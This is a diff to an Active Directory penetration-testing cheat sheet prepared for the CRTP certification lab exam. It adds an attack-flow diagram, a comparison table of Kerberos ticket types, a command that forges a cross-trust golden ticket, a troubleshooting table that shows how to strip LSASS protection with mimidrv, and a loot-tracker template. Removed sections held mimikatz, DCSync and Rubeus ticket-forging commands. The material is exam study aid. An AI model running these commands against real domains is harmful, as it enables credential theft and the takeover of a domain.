@@ -1,7 +1,87 @@
 # 00 — Quick Reference & Exam Command Cheat Sheet
 
 > [!TIP]
-> **Exam Strategy:** Replace placeholders (`<DOMAIN>`, `<USER>`, `<TARGET>`, `<AES256_KEY>`, `<DOMAIN_SID>`, `<KRBTGT_AES256>`) with your lab/exam values.
+> **Exam Strategy:** Replace placeholders (`<DOMAIN>`, `<USER>`, `<TARGET>`, `<AES256_KEY>`, `<DOMAIN_SID>`, `<KRBTGT_AES256>`, `<ENTERPRISE_ADMIN_SID>`) with your lab/exam values.
+
+---
+
+## CRTP Master Attack Flow
+
+```text
+              INITIAL ACCESS
+                     │
+                     ▼
+              whoami /all
+              hostname
+              ipconfig /all
+                     │
+                     ▼
+             DOMAIN ENUMERATION
+                     │
+      ┌──────────────┼──────────────┐
+      ▼              ▼              ▼
+    USERS          GROUPS       COMPUTERS
+      │              │              │
+      └──────────────┼──────────────┘
+                     ▼
+              OU / GPO / ACL
+                     │
+                     ▼
+                  TRUSTS
+                     │
+                     ▼
+           LOCAL ADMIN ACCESS?
+                /         \
+              YES          NO
+               │            │
+               ▼            ▼
+        SESSION HUNT     ACL/GPO/DELEGATION
+               │            │
+               └─────┬──────┘
+                     ▼
+             CREDENTIAL ACCESS
+                     │
+          ┌──────────┼───────────┐
+          ▼          ▼           ▼
+        LSASS      FILES      KERBEROS
+          │          │           │
+          └──────────┼───────────┘
+                     ▼
+              OPTH / PTT / S4U
+                     │
+                     ▼
+             LATERAL MOVEMENT
+                     │
+                     ▼
+                DOMAIN ADMIN
+                     │
+                     ▼
+                  DCSYNC
+                     │
+                     ▼
+             DOMAIN DOMINANCE
+                     │
+                     ▼
+              TRUST ENUMERATION
+                     │
+                     ▼
+             CROSS-TRUST ATTACK
+                     │
+                     ▼
+             ENTERPRISE ADMIN
+```
+
+---
+
+## Ticket Comparison Matrix
+
+| Ticket Type | Required Secret | Issuer | Target Scope | Key Use Case |
+| :--- | :--- | :--- | :--- | :--- |
+| **Golden Ticket** | `krbtgt` password hash / AES256 key | Forged offline (KDC bypassed) | Entire Domain (Domain Admin) | Complete domain persistence and full access to all domain hosts. |
+| **Silver Ticket** | Target Service Account hash / AES key | Forged offline | Specific Service / Host (e.g. CIFS, HTTP, WMI) | Stealthy access to specific service without contacting DC. |
+| **Diamond Ticket** | `krbtgt` AES256 key + valid TGT | Real KDC (signed PAC modified) | Entire Domain (Domain Admin) | Bypass TGT request anomaly detection by modifying PAC of a real TGT. |
+| **S4U2Self / S4U2Proxy** | Delegation Account hash / AES key | Real KDC | Allowed downstream SPN (`msDS-AllowedToDelegateTo`) | Impersonate any user (e.g. Administrator) to delegated services. |
+| **Overpass-the-Hash (OPTH)** | User NTLM hash / AES256 key | Real KDC | Target User permissions | Obtain valid Kerberos TGT without knowing plaintext password. |
 
 ---
 
@@ -21,7 +101,7 @@
 | **OUs** | `Get-DomainOU` | `Get-ADOrganizationalUnit -Filter *` |
 | **GPOs** | `Get-DomainGPO` | `Get-ADGPO -All` |
 | **Domain Trusts** | `Get-DomainTrust` | `Get-ADTrust -Filter *` |
-| **Forest Trusts** | `Get-ForestTrust` | `Get-ADForest | %{ Get-ADTrust -Filter * }` |
+| **Forest Trusts** | `Get-ForestTrust` | `Get-ADForest \| %{ Get-ADTrust -Filter * }` |
 | **Object ACLs** | `Get-DomainObjectAcl -Identity <NAME>` | `(Get-ACL 'AD:\CN=...').Access` |
 
 ---
@@ -55,16 +135,6 @@ nxe smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --shares --loggedon-
 
 # Spider shares for password/config files
 nxe smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --spider "C$" --pattern "unattend*,*.kdbx,*.config,pass*"
-```
-
----
-
-## Script & Module Loading
-
-```powershell
-. C:\AD\Tools\PowerView.ps1
-Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
-Get-Command -Module ActiveDirectory
 ```
 
 ---
@@ -103,8 +173,9 @@ impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
 impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
 impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET> "whoami"
 
-# Golden Ticket
+# Golden Ticket & Cross-Trust Ticket
 impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
+impacket-ticketer -nthash <TRUST_KEY_NTLM> -domain-sid <CHILD_SID> -domain <CHILD_DOMAIN> -extra-sid <ENTERPRISE_ADMIN_SID> Administrator
 
 # RBCD
 impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-to <TARGET>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write
@@ -143,109 +214,25 @@ bloodyAD -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> get object '<GMSA_AC
 
 ---
 
-## Credential Extraction
+## Command Troubleshooting — "Command Failed? Try This"
 
-```cmd
-mimikatz.exe "sekurlsa::ekeys" "exit"
-SafetyKatz.exe "sekurlsa::ekeys" "exit"
-```
-
-```text
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # sekurlsa::logonpasswords
-mimikatz # lsadump::secrets
-```
+| Symptom / Error | Probable Cause | Fix / Alternative Command |
+| :--- | :--- | :--- |
+| **WinRM `Access Denied` / 0x8009030e** | User not Local Admin or WinRM service restricted | Use WMI (`Invoke-WmiMethod`), PsExec (`sc.exe`), or check `Get-NetLocalGroupMember`. |
+| **PowerView `Get-Domain` returns null** | Script not dot-sourced or domain unresolvable | Execute `. .\PowerView.ps1` (include dot-space) or specify `-Domain <FQDN> -Server <DC_IP>`. |
+| **Rubeus `KrbException: KRB_AP_ERR_SKEW`** | System clock out of sync with DC | Sync clock: `net time \\<DC_IP> /set /y` or `w32tm /resync`. |
+| **DCSync `RPC_S_SERVER_UNAVAILABLE`** | DNS resolution failed for DC FQDN | Specify IP address directly or add DC to `C:\Windows\System32\drivers\etc\hosts`. |
+| **Kerberos Ticket import ignored** | Session context mismatch | Purge tickets (`klist purge` / `Rubeus.exe purge`), then import with `Rubeus.exe ptt` in elevated prompt. |
+| **Mimikatz LSASS `0x00000005 ACCESS DENIED`** | LSA Protection (PPL) enabled | Load driver to remove PPL: `!drv::install mimidrv.sys` then `!processprotect /process:lsass.exe /remove`. |
 
 ---
 
-## Kerberos Ticket Abuse
+## Credentials & Exam Loot Tracker
 
-### Overpass-the-Hash
-```text
-sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe
-```
-```cmd
-Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /ptt
-Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
-```
+Use this Markdown table template during the exam to track compromised credentials:
 
-### DCSync
-```text
-lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt
-```
-
-### Golden Ticket
-```cmd
-Rubeus.exe golden /aes256:<KRBTGT_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /printcmd
-```
-
-### Silver Ticket
-```cmd
-Rubeus.exe silver /service:http/<TARGET_FQDN> /aes256:<SERVICE_AES256> /sid:<DOMAIN_SID> /ldap /user:Administrator /domain:<DOMAIN>
-```
-
-> [!IMPORTANT]
-> For WMI via Silver Ticket, generate tickets for **both** `HOST` and `RPCSS` services.
-
----
-
-## Constrained Delegation (S4U)
-
-```powershell
-Get-NetUser -TrustedToAuth
-Get-DomainComputer -TrustedToAuth
-```
-```cmd
-Rubeus.exe s4u /user:<DELEGATED_ACCOUNT> /aes256:<KEY> /impersonateuser:Administrator /msdsspn:time/<TARGET_DC> /ptt
-```
-
----
-
-## AD CS Certificate Abuse
-
-```cmd
-Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<CERT_PFX> /password:<CERT_PASSWORD> /outfile:<TGT_FILE> /domain:<DOMAIN> /dc:<DC_IP> /ptt
-```
-
----
-
-## Post-Exploitation Credentials & Vaults
-
-```cmd
-vaultcmd /list
-vaultcmd /listproperties:"Web Credentials"
-```
-
-```text
-C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-```
-
----
-
-## Local Privilege Escalation (PowerUp)
-
-```powershell
-. C:\AD\Tools\PowerUp.ps1
-Invoke-AllChecks
-Invoke-ServiceAbuse -Name '<VULNERABLE_SERVICE>' -Username '<DOMAIN>\<USER>' -Verbose
-```
-
----
-
-## Local Admin & Session Discovery
-
-```powershell
-Find-LocalAdminAccess
-Get-NetSession
-Find-DomainShare
-. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
-```
-
-```cmd
-winrs -r:<TARGET> cmd
-```
-
-```powershell
-Enter-PSSession -ComputerName <TARGET>
-```
+| Host / Scope | Account / User | Type (Pass/Hash/AES) | Value / Secret | Privilege Level | Usable Protocols | Source |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+| `172.16.2.5` | `student1` | Plaintext | `P@ss123!` | Domain User | WinRM, SMB, Kerberos | Initial Access |
+| `DC01` | `svc_sql` | NTLM Hash | `2b57...` | Local Admin | WMI, WinRM, OPTH | LSASS Dump |
+| `Domain` | `krbtgt` | AES256 Key | `c4d9...` | KDC Master | Golden/Diamond Ticket | DCSync |
